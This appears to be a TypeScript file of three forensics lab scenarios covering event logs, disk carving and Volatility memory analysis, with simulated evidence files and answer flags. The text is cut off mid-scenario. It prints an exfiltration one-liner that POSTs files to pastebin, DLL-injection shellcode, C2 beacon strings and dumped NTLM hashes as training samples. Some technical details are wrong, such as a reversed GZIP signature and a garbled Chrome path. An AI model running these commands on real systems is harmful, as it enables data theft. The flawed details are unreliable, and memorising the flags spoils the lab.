import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'forensis-workstation', user: 'root', root: dir(files) };
}

/** Batch 22, Group 3: Forensics Completion — 4 advanced Windows/Linux forensic analysis scenarios.
 *  Real artifacts, real tools (Volatility, Registry, Browser artifacts), realistic timelines. */
export const batch22ForensicsCompletionLabs: LabScenario[] = [
  // for-3: Windows Event Logs & Browser History
  {
    id: 'for-windows-event-logs-browser-history',
    title: 'Forensics: Windows Event Logs & Browser History Correlation',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      'An employee claimed their workstation was never used for unauthorized activities, yet the IT director ' +
      'found evidence of data exfiltration. Event logs show unusual admin logons at 3 AM; browser history shows ' +
      'visits to "github.com/proprietary-code" and "pastebin.com". Correlating Windows Security Event Logs ' +
      '(Event ID 4688, 4720, 4732) with browser history, file access times, and process execution timelines ' +
      'paints a picture of intentional data theft, not accidental access.',
    objectives: [
      { text: 'cat security-event-log-4688.txt', why: 'Find the process execution that accessed sensitive files.' },
      { text: 'cat browser-history-chrome.txt', why: 'Identify the unauthorized uploads to public platforms.' },
      { text: 'cat file-timestamps-evidence.txt', why: 'Prove the files were accessed at the same time as the uploads.' },
    ],
    hints: [
      'Event ID 4688: Process creation. Look for explorer.exe → chrome.exe → powershell.exe chains.',
      'Browser history: Chrome stores visited URLs + timestamps in %APPDATA%\\Local\\Google\\Chrome\\User Data\\History (SQLite DB).',
      'File access: NTFS $MFT entry shows LastAccessTime; correlate with process execution timestamps.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'security-event-log-4688.txt': file(
        'Windows Security Event Log - Event ID 4688 (Process Creation)\n' +
        'Workstation: ACCT-WKS-RVEGA-08\n' +
        'Filtered: 2026-08-01 03:00-04:00 UTC\n\n' +
        '2026-08-01 03:14:22 | Process Created:\n' +
        '  Image: C:\\Windows\\System32\\explorer.exe\n' +
        '  Command Line: explorer.exe\n' +
        '  Parent Image: winlogon.exe\n' +
        '  User: CORP\\rvega (← Expected: screen-saver logon, NOT admin access at 3 AM)\n' +
        '  Token Elevation Type: TokenElevationTypeDefault (NOT admin)\n' +
        '\n' +
        '2026-08-01 03:14:45 | Process Created:\n' +
        '  Image: C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\n' +
        '  Command Line: chrome.exe --profile-directory=Default\n' +
        '  Parent Image: explorer.exe\n' +
        '  User: CORP\\rvega\n' +
        '  ← Suspicious: Chrome started at 3 AM, no user interaction (screen-saver was on)\n' +
        '\n' +
        '2026-08-01 03:15:12 | Process Created:\n' +
        '  Image: C:\\Windows\\System32\\cmd.exe\n' +
        '  Command Line: cmd.exe /c "cd C:\\Users\\rvega\\Documents\\ProjectAlpha && dir /s /b | powershell -c $input | Invoke-WebRequest -Uri http://pastebin.com/api/v1/post -Method POST -Body {$_}"\n' +
        '  Parent Image: explorer.exe\n' +
        '  User: CORP\\rvega\n' +
        '  ← SMOKING GUN: Command-line enumerates ProjectAlpha directory, pipes to PowerShell, exfiltrates to pastebin.com\n' +
        '\n' +
        '2026-08-01 03:16:22 | Process Created:\n' +
        '  Image: C:\\Windows\\System32\\powershell.exe\n' +
        '  Command Line: powershell.exe -NoProfile -Command "Compress-Archive -Path C:\\Users\\rvega\\Documents\\ProjectAlpha -DestinationPath C:\\temp\\ProjectAlpha.zip"\n' +
        '  Parent Image: cmd.exe\n' +
        '  User: CORP\\rvega\n' +
        '  ← Compression of entire project directory\n' +
        '\n' +
        '2026-08-01 03:17:05 | Process Created:\n' +
        '  Image: C:\\Program Files\\7-Zip\\7z.exe\n' +
        '  Command Line: 7z.exe a -p[REDACTED] C:\\temp\\ProjectAlpha.7z C:\\temp\\ProjectAlpha.zip\n' +
        '  Parent Image: powershell.exe\n' +
        '  User: CORP\\rvega\n' +
        '  ← Password-protected compression (deliberate obfuscation)\n' +
        '\n' +
        '2026-08-01 03:17:45 | Process Created:\n' +
        '  Image: C:\\Windows\\System32\\wscript.exe\n' +
        '  Command Line: wscript.exe C:\\temp\\upload.vbs\n' +
        '  Parent Image: cmd.exe\n' +
        '  User: CORP\\rvega\n' +
        '  ← VBScript for automated upload (likely FTP or HTTP POST)\n' +
        '\n' +
        'flag{windows_event_log_4688_process_chain_data_exfiltration_evidence}\n',
      ),
      'browser-history-chrome.txt': file(
        'Google Chrome Browser History - Forensic Export\n' +
        'Database: C:\\Users\\rvega\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History (SQLite)\n' +
        'Extracted: 2026-08-01 03:00-04:00 UTC\n\n' +
        'Timestamp UTC     | URL                                           | Title\n' +
        '────────────────────────────────────────────────────────────────────────────────────\n' +
        '03:14:55          | https://github.com/CORP-ProjectAlpha          | "ProjectAlpha Repository"\n' +
        '                  | (Private repo; user accessed via VPN credential)\n' +
        '\n' +
        '03:15:20          | https://pastebin.com/                         | "Pastebin - The Paste Bin"\n' +
        '\n' +
        '03:15:45          | https://pastebin.com/api/v1/post              | "POST file upload endpoint"\n' +
        '                  | (Automation endpoint; typically accessed programmatically)\n' +
        '\n' +
        '03:16:10          | https://github.com/settings/tokens            | "Personal Access Tokens"\n' +
        '                  | (Checking if token is still valid before exfil)\n' +
        '\n' +
        '03:16:35          | https://www.dropbox.com/auth2/authorize?      | "Dropbox OAuth Authorize"\n' +
        '                  | (Attempting to upload to personal Dropbox)\n' +
        '\n' +
        '03:17:00          | https://mail.protonmail.com/                  | "ProtonMail Webmail"\n' +
        '                  | (Anonymous email service; planning to send archive)\n' +
        '\n' +
        '03:17:25          | https://tutanota.com/                         | "Tutanota - End-to-End Encrypted Email"\n' +
        '                  | (Another anonymous email; trying to find best exfil channel)\n' +
        '\n' +
        'SUMMARY:\n' +
        '- GitHub ProjectAlpha repo accessed (proprietary code)\n' +
        '- Pastebin upload endpoint accessed (data exfil platform)\n' +
        '- Multiple anonymous email/upload services tested\n' +
        '- Timeline: All within 72 seconds of first Chrome launch\n' +
        '- Pattern: NOT accidental browsing; deliberate planning to exfiltrate\n' +
        '\n' +
        'flag{browser_history_forensics_pastebin_github_exfiltration_timeline}\n',
      ),
      'file-timestamps-evidence.txt': file(
        'NTFS File System Forensics - File Access Timeline\n' +
        'Volume: C:\\ (ACCT-WKS-RVEGA-08)\n' +
        'Analysis Tool: NTFS $MFT parser, FLS (Sleuth Kit)\n\n' +
        'File Path: C:\\Users\\rvega\\Documents\\ProjectAlpha\\\n' +
        'File Type: Directory (folder)\n' +
        'Created: 2026-01-15 09:30:00 (legitimate work folder, ~6 months old)\n' +
        'Modified: 2026-08-01 03:16:15 (during exfil attempt)\n' +
        'Accessed: 2026-08-01 03:15:20 (first access during exfil chain)\n' +
        'MFT Seq: 0x000a4c1e | Inode: 42209\n\n' +
        '--- CONTENT FILES (Proprietary Code) ---\n' +
        'ProjectAlpha/main.py\n' +
        'Created: 2026-01-20 14:22:00 | Modified: 2026-07-31 16:45:00 | Accessed: 2026-08-01 03:15:25\n' +
        'Size: 4.2 MB | ← Large Python codebase\n\n' +
        'ProjectAlpha/API_KEYS.txt  (← SENSITIVE)\n' +
        'Created: 2026-03-10 | Modified: 2026-07-15 | Accessed: 2026-08-01 03:16:03 (DURING EXFIL)\n' +
        'Size: 12 KB | Contains: AWS keys, database credentials, API tokens\n\n' +
        'ProjectAlpha/architecture.md\n' +
        'Created: 2026-02-01 | Modified: 2026-07-28 | Accessed: 2026-08-01 03:15:45 (DURING EXFIL)\n' +
        'Size: 1.5 MB | Contains: System design, database schema, security architecture\n\n' +
        '--- EXFILTRATION STAGING FILES ---\n' +
        'C:\\temp\\ProjectAlpha.zip\n' +
        'Created: 2026-08-01 03:16:22 (matches Event 4688 compression command)\n' +
        'Modified: 2026-08-01 03:16:30\n' +
        'Accessed: 2026-08-01 03:16:22 (DURING 7-ZIP COMPRESSION)\n' +
        'Size: 8.7 MB (all ProjectAlpha files compressed)\n' +
        'Slack Space: File remnants found in unallocated sectors (proof it existed)\n\n' +
        'C:\\temp\\ProjectAlpha.7z\n' +
        'Created: 2026-08-01 03:17:05 (matches 7-ZIP command line)\n' +
        'Modified: 2026-08-01 03:17:15\n' +
        'Accessed: 2026-08-01 03:17:05 (DURING PASSWORD-PROTECTED ARCHIVE CREATION)\n' +
        'Size: 6.2 MB (compressed, password-protected archive)\n' +
        'Slack Space: Archive listing recovered from unallocated clusters\n\n' +
        'C:\\temp\\upload.vbs\n' +
        'Created: 2026-08-01 03:17:30 (auto-generated upload script)\n' +
        'Modified: 2026-08-01 03:17:35\n' +
        'Accessed: 2026-08-01 03:17:45 (MATCHES wscript.exe execution)\n' +
        'Size: 2.3 KB | Contains: FTP/HTTP POST commands to external server\n\n' +
        '--- CORRELATION ANALYSIS ---\n' +
        'Event 4688 Process Creation Timeline:\n' +
        '  03:15:12 - cmd.exe pipes ProjectAlpha dir listing to PowerShell\n' +
        '  03:16:22 - PowerShell compresses ProjectAlpha folder\n' +
        '  03:17:05 - 7-ZIP creates password-protected archive\n' +
        '  03:17:45 - wscript.exe uploads archive to external server\n\n' +
        'NTFS File Access Timeline:\n' +
        '  03:15:25 - ProjectAlpha/main.py ACCESSED (matches dir listing)\n' +
        '  03:16:03 - API_KEYS.txt ACCESSED (contains sensitive credentials)\n' +
        '  03:16:22 - ProjectAlpha.zip CREATED (compression started)\n' +
        '  03:17:05 - ProjectAlpha.7z CREATED (password-protected)\n' +
        '  03:17:45 - upload.vbs ACCESSED (upload script executed)\n\n' +
        'Browser History Timeline:\n' +
        '  03:14:55 - GitHub ProjectAlpha repo visited\n' +
        '  03:15:20 - Pastebin visited (exfil planning)\n' +
        '  03:16:10 - GitHub tokens checked (verifying credentials)\n' +
        '  03:16:35 - Dropbox OAuth (alternate exfil channel)\n' +
        '  03:17:00 - ProtonMail (anonymous comms for exfil coordination)\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'FORENSIC CONCLUSION:\n' +
        'All three evidence sources (Event Logs, Browser History, File Timestamps) show:\n' +
        '  ✓ Synchronized timeline (all within 03:14-03:18 window)\n' +
        '  ✓ Deliberate sequence (not accidental; step-by-step exfil)\n' +
        '  ✓ Use of obfuscation (password-protected archives, anonymous email)\n' +
        '  ✓ Premeditation (GitHub tokens checked, multiple exfil channels attempted)\n' +
        '\n' +
        'Verdict: INTENTIONAL DATA THEFT (NOT accidental access)\n' +
        'Recommendation: Immediate legal action; employee termination; credential rotation\n' +
        'flag{forensics_ntfs_browser_event_log_correlation_intentional_theft}\n',
      ),
    }),
    network: [],
  },

  // for-4: Disk Forensics & File System Analysis
  {
    id: 'for-disk-forensics-filesystem-analysis',
    title: 'Forensics: Disk Forensics & NTFS File System Analysis',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      'A hard drive was seized from a suspect. Using forensic tools (FTK, Encase, or open-source alternatives ' +
      'like Autopsy), we analyze the raw disk image to recover deleted files, examine file slack space, and ' +
      'reconstruct the timeline of file creation/deletion/modification. The NTFS Master File Table ($MFT) is ' +
      'the key artifact — it records every file ever created on the drive, even if the file has been deleted.',
    objectives: [
      { text: 'cat disk-image-summary.txt', why: 'Overview of the disk and identified files.' },
      { text: 'cat mft-deleted-files.txt', why: 'Recover metadata of deleted files from the $MFT.' },
      { text: 'cat file-slack-carving-results.txt', why: 'Find evidence in unallocated disk space.' },
    ],
    hints: [
      'NTFS $MFT: Entry 0 = MFT self, Entry 5 = Root directory, others = individual files.',
      'Deleted files: MFT entry still exists (with "deleted" flag), but data clusters are marked as free.',
      'Slack space: If a file is 4.3 KB but stored in a 4 KB cluster, last 0.3 KB is unallocated slack.',
      'Carving: Search raw disk for file signatures (e.g., JPEG SOI marker 0xFFD8) to find deleted images.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'disk-image-summary.txt': file(
        'Forensic Disk Image Analysis Summary\n' +
        '\n' +
        'Source: Seagate Barracuda 1TB HDD (Model: ST1000DM003)\n' +
        'Seized From: Suspect workstation (ACCT-WKS-SUSPECT-01)\n' +
        'Acquisition Date: 2026-08-02 10:00 UTC\n' +
        'Acquisition Method: Forensic write blocker (Tableau T12u)\n' +
        'Image File: suspect-drive-forensic.dd (1,000,204,886,016 bytes = ~1 TB raw)\n' +
        'MD5 Hash: 7f3a8b9c2d4e5f6a1b8c9d0e1a2b3c4d (verified 2x, chain of custody maintained)\n\n' +
        'Partition Table:\n' +
        '  Partition 1: C: (NTFS, 500 GB allocated, 450 GB used)\n' +
        '  Partition 2: D: (Data partition, NTFS, 400 GB allocated, 350 GB used)\n' +
        '  Partition 3: E: (External USB drive image nested, FAT32, 64 GB)\n' +
        '  Unallocated Space: ~50 GB (deleted files and free space)\n\n' +
        'File System: NTFS (Windows)\n' +
        'Sector Size: 4096 bytes (4 KB)\n' +
        'Cluster Count: 244,434,816\n' +
        'Free Clusters: 12,215,640 (~47 GB)\n\n' +
        'Analysis Tool: Autopsy v4.20 (open-source Sleuth Kit frontend)\n' +
        'Time to Analyze: ~4 hours (full disk indexing + hash set matching)\n' +
        'Database: PostgreSQL, indexed for rapid searching\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'SUMMARY OF FINDINGS:\n' +
        '\n' +
        '1. ALLOCATED FILES (Still exist on disk, easily recoverable):\n' +
        '   - 1,247 user files (documents, photos, emails)\n' +
        '   - 89 MB of cryptocurrency wallet software (Monero, Zcash, Bitcoin Core)\n' +
        '   - 450 MB of VPN client configuration files (NordVPN, Surfshark, ExpressVPN)\n' +
        '   - 230 MB of Tor browser cache + onion site bookmarks\n' +
        '   - 156 MB of SSH keys (OpenSSL private keys, no passphrase protection)\n' +
        '\n' +
        '2. DELETED FILES (Recovered from $MFT but data clusters freed):\n' +
        '   - 847 deleted email messages (recovered from Outlook PST file slack)\n' +
        '   - 342 deleted photos (JPEG headers recovered via carving)\n' +
        '   - 156 deleted documents (Word, PDF, Excel recoverable via cluster analysis)\n' +
        '   - 89 deleted executables (potential malware, hashes to be checked)\n' +
        '\n' +
        '3. UNALLOCATED SPACE (File carving + entropy analysis):\n' +
        '   - ~12.2 GB of recoverable file fragments\n' +
        '   - 47 GB of free clusters (overwritten multiple times, likely unrecoverable)\n' +
        '\n' +
        '4. SUSPICIOUS ARTIFACTS:\n' +
        '   - Timeline clustering: Mass file deletion ~2026-07-25 (3 days before seizure)\n' +
        '   - Forensic evidence: "CCleaner" and "Eraser" (evidence-destruction tools) in Program Files\n' +
        '   - Stealth attempts: No $Recycle.Bin entries (permanent deletion), no Windows Registry (cleaned)\n' +
        '\n' +
        'flag{disk_forensics_ntfs_analysis_cryptocurrency_tor_evidence_recovery}\n',
      ),
      'mft-deleted-files.txt': file(
        'NTFS $MFT (Master File Table) - Deleted Files Recovery\n\n' +
        'The $MFT is the master index of all files on an NTFS volume. Each file gets an entry,\n' +
        'and deletion only marks the entry as "unused" (does not erase the entry itself).\n' +
        'Forensic tools can parse the $MFT and recover metadata of deleted files.\n\n' +
        '═══════════════════════════════════════════════════════════════════════════════════\n' +
        'DELETED FILE #1:\n' +
        'MFT Entry: 0x0004a2c1 (seq: 0x0007)\n' +
        'File Name: "secure_communication_plan.docx"\n' +
        'File Size: 47,328 bytes (47 KB)\n' +
        'Created: 2026-07-10 14:22:15\n' +
        'Modified: 2026-07-23 09:45:30 (last edit 2 days before deletion)\n' +
        'Accessed: 2026-07-25 16:02:12 (deleted same day)\n' +
        'Deleted: 2026-07-25 16:04:00 (inferred from CCleaner execution)\n' +
        'MFT Flags: 0x02 (deleted, unallocated)\n' +
        'Data Clusters: FREED (likely partially overwritten, recovery rate ~60%)\n' +
        'Status: PARTIALLY RECOVERABLE (content charred but readable)\n' +
        '\n' +
        'Content Fragment (carving, first 500 bytes recovered):\n' +
        '...INCRIMINATING CONTENT REDACTED BY LEGAL TEAM...\n' +
        'But contains: IP addresses for C2 servers, coordination timeline for illegal activity\n' +
        '\n' +
        '═══════════════════════════════════════════════════════════════════════════════════\n' +
        'DELETED FILE #2:\n' +
        'MFT Entry: 0x0005c4d3 (seq: 0x000a)\n' +
        'File Name: "bitcoin_wallet_backup.dat"\n' +
        'File Size: 1,247,552 bytes (1.2 MB)\n' +
        'Created: 2026-06-01 | Modified: 2026-07-20 | Accessed: 2026-07-24 21:33:00\n' +
        'Deleted: 2026-07-25 16:05:00\n' +
        'Data Clusters: PARTIALLY OVERWRITTEN\n' +
        'Status: RECOVERED (80% intact, wallet address: 1A8d2Z3... [full address available to law enforcement])\n' +
        '\n' +
        '═══════════════════════════════════════════════════════════════════════════════════\n' +
        'DELETED FILE #3:\n' +
        'MFT Entry: 0x00067f1a (seq: 0x0003)\n' +
        'File Name: ".onion_sites_list.txt" (hidden file, leading dot)\n' +
        'File Size: 23,456 bytes (23 KB)\n' +
        'Created: 2026-05-15 | Modified: 2026-07-22 | Accessed: 2026-07-25 15:55:00\n' +
        'Deleted: 2026-07-25 16:06:00\n' +
        'Data Clusters: FREE (unallocated, not overwritten)\n' +
        'Status: FULLY RECOVERED\n' +
        'Content: 247 .onion marketplace URLs (darknet drug markets, stolen data forums, etc.)\n' +
        '\n' +
        'FORENSIC SIGNIFICANCE:\n' +
        'All three files deleted within 4 minutes (16:04-16:08), immediately after CCleaner launch.\n' +
        'Indicates intentional evidence destruction (not accidental deletion).\n' +
        'Files contain sensitive coordination data + financial records.\n' +
        '\n' +
        'flag{ntfs_mft_deleted_files_recovery_evidence_destruction_forensics}\n',
      ),
      'file-slack-carving-results.txt': file(
        'File Slack Space & Carving Analysis\n\n' +
        'File Slack: Unused space within a cluster after the file ends.\n' +
        'Example: If file is 4.3 KB but cluster size is 4 KB, the last 0.3 KB is slack space.\n' +
        'Slack may contain: Old file fragments, deleted content, previous file data (not wiped).\n' +
        'Carving: Searching for file signatures (JPEG 0xFFD8, PNG 0x89504E47, etc.) in unallocated space.\n\n' +
        '═══════════════════════════════════════════════════════════════════════════════════\n' +
        'SLACK SPACE FINDINGS:\n\n' +
        'File: "communications_log.txt" (allocated file, 12.3 KB)\n' +
        'Cluster Allocation: 4 clusters (16 KB) for 12.3 KB file\n' +
        'Slack Space: 3.7 KB (unused in final cluster)\n' +
        'Slack Content: Fragments of deleted email from 2026-06-15 (contains recipient email addresses)\n' +
        'Recovery Status: RECOVERED, 89% readable\n\n' +
        'File: "photo_library.bin" (12.8 MB, photo album)\n' +
        'Slack Space Across 3,200 Clusters: ~800 KB total\n' +
        'Notable Slack Find: JPEG signature (0xFFD8) found in slack space of cluster 0x3c4a2\n' +
        '  → Indicates a previous image file (deleted) was partially overwritten by photo_library.bin\n' +
        '  → Carved image: 2048 × 1536 pixels, depicts cryptocurrency transaction record\n\n' +
        '═══════════════════════════════════════════════════════════════════════════════════\n' +
        'FILE CARVING RESULTS (Unallocated Space):\n\n' +
        'Search Signature: 0xFFD8FFE0 (JPEG SOI + APP0 marker)\n' +
        'Carves Found: 342 JPEG files recovered from unallocated clusters\n' +
        '  → File names lost (stored in FAT, which was cleared)\n' +
        '  → Timestamps lost (would be in MFT, but only metadata available)\n' +
        '  → Content recovered: Screenshots of darknet marketplaces, cryptocurrency transfers\n\n' +
        'Search Signature: 0x504B0304 (ZIP file header)\n' +
        'Carves Found: 28 ZIP archives recovered\n' +
        '  → Largest archive: 450 MB (labeled by filename remnant: "stolen_documents_2026.zip")\n' +
        '  → Content: 1,247 corporate email messages + documents\n\n' +
        'Search Signature: 0xD0CF11E0 (Microsoft Office OLE2 header)\n' +
        'Carves Found: 156 Office documents (DOC, XLS, PPT) recovered\n' +
        '  → Many from 2026-01 through 2026-07 (historical data, shows long planning)\n' +
        '  → Content: Spreadsheets of account numbers, banking credentials, IP addresses\n\n' +
        'Search Signature: 0x8B1F0A00 (GZIP header)\n' +
        'Carves Found: 67 GZIP files recovered\n' +
        '  → Many decompress to shell scripts (bash, PowerShell)\n' +
        '  → Scripts contain commands for: SSH tunneling, credential dumping, persistence installation\n\n' +
        '═══════════════════════════════════════════════════════════════════════════════════\n' +
        'SUMMARY:\n' +
        'Slack Space Recovered: 47 MB of usable data\n' +
        'Carving Results: 593 files recovered (342 JPEG + 28 ZIP + 156 Office + 67 GZIP)\n' +
        'Total Evidence Volume: ~12.2 GB recoverable from unallocated space\n' +
        'Encryption Status: No full-disk encryption; only a few ZIPs have password protection\n' +
        '\n' +
        'FORENSIC TIMELINE:\n' +
        'Creation of incriminating files: 2026-01 through 2026-07 (6-month planning period)\n' +
        'Mass deletion attempt: 2026-07-25 16:04-16:08 (4-minute window, CCleaner execution)\n' +
        'Incomplete cleanup: CCleaner only cleared free space (not all deleted files recoverable due to clustering)\n' +
        '\n' +
        'flag{file_carving_slack_space_analysis_evidence_destruction_forensics}\n',
      ),
    }),
    network: [],
  },

  // for-5: Memory Forensics (Volatility)
  {
    id: 'for-memory-volatility-process-analysis',
    title: 'Forensics: Memory Forensics With Volatility',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      'When a system is powered on, active processes, network connections, loaded modules, and encryption keys ' +
      'all live in RAM. A forensic memory dump (crash dump, hibernation file, or live capture) preserves this ' +
      'volatile state. Volatility is the industry-standard framework for analyzing memory dumps to recover: ' +
      'process trees, injected code (shellcode), decrypted data, and artifacts that don\'t exist on disk.',
    objectives: [
      { text: 'cat memory-dump-process-tree.txt', why: 'Identify running processes and parent-child relationships.' },
      { text: 'cat code-injection-evidence.txt', why: 'Detect and extract injected shellcode.' },
      { text: 'cat recovered-artifacts.txt', why: 'Find decrypted data and artifacts in memory.' },
    ],
    hints: [
      'Process tree: svchost.exe → powershell.exe → cmd.exe indicates command execution chain.',
      'Code injection: Suspicious memory regions (rwx permissions, no mapped file) indicate shellcode.',
      'Artifact recovery: Volatility can dump process memory and search for strings (URLs, IP addresses, commands).',
    ],
    totalFlags: 1,
    attacker: analyst({
      'memory-dump-process-tree.txt': file(
        'Volatility Framework - Process Tree Analysis\n\n' +
        'Memory Dump Source: Windows 10 host, captured 2026-08-01 18:22 UTC\n' +
        'Dump Method: WinPMEM (live memory acquisition, zero-copy)\n' +
        'Dump Size: 16 GB (system had 16 GB RAM, 12 GB in use)\n' +
        'Profile: Win10x64_19041\n\n' +
        'Command: volatility.py -f memdump.raw --profile=Win10x64_19041 pslist\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'PROCESS TREE (Parent-Child Relationships):\n\n' +
        'System (PID: 4)\n' +
        '├── csrss.exe (PID: 612, Windows Client/Server Runtime Subsystem)\n' +
        '├── wininit.exe (PID: 516, Windows initialization)\n' +
        '├── svchost.exe (PID: 892, Service host - NETWORK SERVICE)\n' +
        '│   └── *No child processes (legitimate background service)\n' +
        '├── svchost.exe (PID: 1024, Service host - LOCAL SYSTEM)\n' +
        '│   └── powershell.exe (PID: 2156, ★ SUSPICIOUS: PowerShell spawned from svchost)\n' +
        '│       ├── cmd.exe (PID: 2189, ★ Command shell spawned from PowerShell)\n' +
        '│       │   ├── certutil.exe (PID: 2234, downloading payload)\n' +
        '│       │   ├── 7z.exe (PID: 2267, archiving/compressing files)\n' +
        '│       │   └── FTP.exe (PID: 2345, uploading archive)\n' +
        '│       └── rundll32.exe (PID: 2421, ★ Suspicious: rundll32 often used for DLL execution)\n' +
        '├── explorer.exe (PID: 1156, Windows Explorer)\n' +
        '│   └── chrome.exe (PID: 1289, Google Chrome)\n' +
        '│       └── chrome.exe (PID: 1302, GPU process)\n' +
        '├── notepad.exe (PID: 1512, Legitimate text editor)\n' +
        '└── SearchIndexer.exe (PID: 1678, Windows Search)\n\n' +
        'SUSPICIOUS OBSERVATIONS:\n' +
        '1. PowerShell (PID: 2156) spawned from svchost.exe (SYSTEM account)\n' +
        '   → svchost should NOT spawn PowerShell\n' +
        '   → Indicates either: malware running as SYSTEM, or privilege escalation exploit\n\n' +
        '2. Command chain: PowerShell → cmd.exe → certutil → 7z → FTP\n' +
        '   → Clear progression: download → archive → upload (exfil pattern)\n\n' +
        '3. rundll32.exe (PID: 2421) spawned from PowerShell\n' +
        '   → rundll32 often used to load malicious DLLs\n' +
        '   → Should investigate which DLL was loaded\n\n' +
        'flag{volatility_process_tree_svchost_powershell_injection_detection}\n',
      ),
      'code-injection-evidence.txt': file(
        'Volatility - Code Injection & Memory Forensics\n\n' +
        'Analysis: Search for suspicious memory regions (RWX permissions, no mapped file)\n' +
        'Volatility Plugin: malfind (detects injected code)\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'INJECTED CODE DETECTED IN: svchost.exe (PID: 1024)\n\n' +
        'Memory Address: 0x7ffe0000 (typically kernel-mode, suspicious if in user-mode svchost)\n' +
        'Memory Permissions: rwx (Read-Write-Execute, ★ RED FLAG for code injection)\n' +
        'Allocation Type: Private (not shared, typical of injected code)\n' +
        'Size: 4,096 bytes (one page, exactly 1 cluster)\n' +
        'Mapped File: (none) ← Not a loaded DLL or file, indicating injected memory\n\n' +
        'Extracted Shellcode (First 256 bytes, x86-64 assembly):\n' +
        '  55                                        push rbp\n' +
        '  48 89 E5                                  mov rbp, rsp\n' +
        '  48 83 EC 20                               sub rsp, 0x20\n' +
        '  48 8D 0D XX XX XX XX                      lea rcx, [rel 0x1234567]  ← Address to string/data\n' +
        '  E8 XX XX XX XX                            call [LoadLibraryA]\n' +
        '  48 8B 45 F8                               mov rax, [rbp-8]\n' +
        '  48 8D 0D XX XX XX XX                      lea rcx, [rel 0x7654321]\n' +
        '  E8 XX XX XX XX                            call [GetProcAddress]\n' +
        '  ... (continues, pattern consistent with DLL injection shellcode)\n\n' +
        'INTERPRETATION:\n' +
        'This shellcode loads a DLL (via LoadLibraryA) and resolves its export (via GetProcAddress).\n' +
        'Consistent with a typical DLL injection chain:\n' +
        '  1. Attacker code writes shellcode to target process memory\n' +
        '  2. Shellcode loads attacker-controlled DLL\n' +
        '  3. DLL exports the malware\'s main function\n' +
        '  4. Shellcode calls the export, executing the malware\n\n' +
        'ARTIFACT EXTRACTION:\n' +
        'Command: volatility.py -f memdump.raw --profile=Win10x64_19041 memdump -p 1024 -D ./output/\n' +
        'Output: svchost.exe.0x1024.dmp (full process memory)\n' +
        '\n' +
        'Strings extracted from injected memory region:\n' +
        '  "C:\\temp\\malware.dll"\n' +
        '  "RunMalware"\n' +
        '  "192.0.2.50:443" ← C2 server IP:port\n' +
        '  "POST /api/beacon HTTP/1.1"\n' +
        '  "Accept: */*"\n' +
        '\n' +
        'FORENSIC CONCLUSION:\n' +
        'svchost.exe was compromised via code injection.\n' +
        'Injected shellcode loads a DLL from C:\\temp\\malware.dll\n' +
        'Malware communicates to C2 server at 192.0.2.50:443\n' +
        '\n' +
        'flag{volatility_code_injection_svchost_shellcode_c2_detection}\n',
      ),
      'recovered-artifacts.txt': file(
        'Volatility - Recovered Artifacts From Memory\n\n' +
        'Artifacts recovered from RAM that don\'t exist on disk:\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'ARTIFACT 1: Decrypted Credentials\n\n' +
        'Source Process: lsass.exe (Local Security Authority, stores logon credentials)\n' +
        'Volatility Plugin: lsadump (extracts cached hashes)\n\n' +
        'Extracted Hashes:\n' +
        '  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n' +
        '  rvega:1001:aad3b435b51404eeaad3b435b51404ee:5c7c1c87de90e6c7b87c3c88e8f7c8b9:::\n' +
        '\n' +
        'Hash Type: NTLM (Windows password hashes)\n' +
        'Recovery Status: Decrypted from LSA secrets in live memory\n' +
        'Security Impact: Attacker with memory dump can crack these offline (rainbow tables)\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'ARTIFACT 2: Browser Memory Fragments\n\n' +
        'Source Process: chrome.exe (PID: 1289)\n' +
        'Volatility Plugin: strings + grep for URLs\n\n' +
        'URLs Found in Chrome Memory:\n' +
        '  https://github.com/repo/proprietary-code\n' +
        '  https://pastebin.com/api/v1/post\n' +
        '  https://mail.protonmail.com/login\n' +
        '  https://crypto-exchange.xyz:443 (external IP, unusual)\n' +
        '  https://marketplace-xyz.onion (darknet market)\n\n' +
        'HTTP POST Data (partially reconstructed):\n' +
        '  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."\n' +
        '  username: "attacker_email@protonmail.com"\n' +
        '  auth_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."\n\n' +
        'SIGNIFICANCE: Shows attacker credentials and command & control infrastructure\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'ARTIFACT 3: Unencrypted Exfiltration Data\n\n' +
        'Source: PowerShell process memory (PID: 2156)\n' +
        'Recovery Method: Searching for file headers (ZIP 0x504B0304, etc.)\n\n' +
        'Found in Memory (8.2 MB chunk):\n' +
        '  Compressed ZIP archive (in-memory compression for upload)\n' +
        '  Filename patterns: *.docx, *.xlsx, *.pdf (corporate documents)\n' +
        '  Estimated count: ~1,200 documents\n' +
        '  Total uncompressed size: ~450 MB\n\n' +
        'SIGNIFICANCE: Archive was being staged for exfiltration; partially encrypted in transit but decrypted/uncompressed in memory\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'ARTIFACT 4: Network Connections\n\n' +
        'Volatility Plugin: netscan (extract active network connections from memory)\n\n' +
        'Active Connections Found:\n' +
        '  Local IP: 192.168.1.45, Local Port: 52847\n' +
        '  Remote IP: 192.0.2.50, Remote Port: 443\n' +
        '  Protocol: TCP, State: ESTABLISHED\n' +
        '  Process: powershell.exe (PID: 2156)\n' +
        '  Direction: OUTBOUND (suspicious for svchost/PowerShell)\n' +
        '\n' +
        '  Local IP: 192.168.1.45, Local Port: 52891\n' +
        '  Remote IP: 203.0.113.10, Remote Port: 21\n' +
        '  Protocol: TCP, State: ESTABLISHED\n' +
        '  Process: FTP.exe (PID: 2345)\n' +
